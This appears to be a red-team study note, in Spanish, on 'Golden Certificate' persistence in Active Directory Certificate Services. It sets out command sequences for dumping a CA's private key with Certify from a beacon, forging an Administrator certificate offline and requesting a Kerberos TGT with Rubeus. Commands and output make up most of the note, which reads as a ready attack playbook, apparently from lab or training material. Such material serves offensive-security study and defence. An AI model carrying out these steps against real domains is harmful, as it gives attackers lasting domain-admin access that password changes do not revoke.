---
tags: [ad, adcs, dpersist1, persistence, golden-certificate, certificates]
status: completo
---

# Golden Certificates — DPERSIST1

> Con acceso al servidor CA, se extrae la clave privada que firma los certificados del dominio. Con ella se pueden forjar certificados offline indefinidamente — el equivalente al krbtgt para ADCS.

> Requiere comprometer la CA (Tier 0). Válido hasta que alguien cambie manualmente la clave de la CA.

## Paso 1 — Extraer keypair de la CA

```
# Desde un beacon en el servidor CA
beacon> run hostname
lon-cs-1

beacon> execute-assembly Certify.exe manage-self --dump-certs --quiet

[*] Certificate (PFX) - CONTOSO Root CA:
MIACAQ[...snip...]AAAAA=
```

## Paso 2 — Guardar el certificado en el attacker desktop

```powershell
[IO.File]::WriteAllBytes(
  "C:\Users\Attacker\Desktop\contoso-root-ca.pfx",
  [Convert]::FromBase64String("MIACAQ[...snip...]AAAAA=")
)
```

## Paso 3 — Forjar certificado para cualquier usuario (offline)

```powershell
Certify.exe forge \
  --ca-cert .\contoso-root-ca.pfx \
  --upn Administrator \
  --subject "CN=Administrator,CN=Users,DC=contoso,DC=com" \
  --sid S-1-5-21-3926355307-1661546229-813047887-500 \
  --crl "ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,..." \
  --quiet

# → Forged certificate (PFX): MIACAQ[...snip...]AAAA==
```

## Paso 4 — Pedir TGT con el certificado forjado

```
beacon> execute-assembly Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:<PFX_forjado_b64> \
  /enctype:aes256 /nowrap
```

## Notas de persistencia

- El certificado robado es válido hasta su `End Date` (puede ser 100 años)
- No se revoca automáticamente aunque cambies la contraseña del admin
- Cambiar la clave de la CA requiere regenerarla manualmente y redistribuir a todos los clientes

## Ver también

- [[05-ad-attacks/ataques/golden-ticket|Golden Ticket]] — equivalente con krbtgt
- [[05-ad-attacks/credential-access/dpapi|DPAPI]] — otra técnica de persistencia a nivel dominio
- [[05-ad-attacks/adcs|ADCS]]
